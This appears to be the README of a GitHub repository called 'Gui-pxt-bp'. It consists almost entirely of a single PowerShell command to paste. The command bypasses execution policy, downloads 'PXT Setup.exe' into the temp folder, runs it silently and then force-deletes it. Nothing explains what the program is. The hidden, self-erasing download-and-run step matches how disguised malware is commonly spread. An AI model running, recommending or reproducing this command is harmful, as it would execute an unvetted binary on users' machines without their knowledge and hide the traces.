powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol='Tls12'; $p=Join-Path $env:TEMP 'pxtsetup.exe'; iwr 'https://github.com/EzPorteV22/Gui-pxt-bp/raw/main/PXT Setup.exe' -OutFile $p -UseBasicParsing; $s=Start-Process $p '--silent' -PassThru; $s.WaitForExit(); Remove-Item $p -Force"
# Gui-pxt-bp
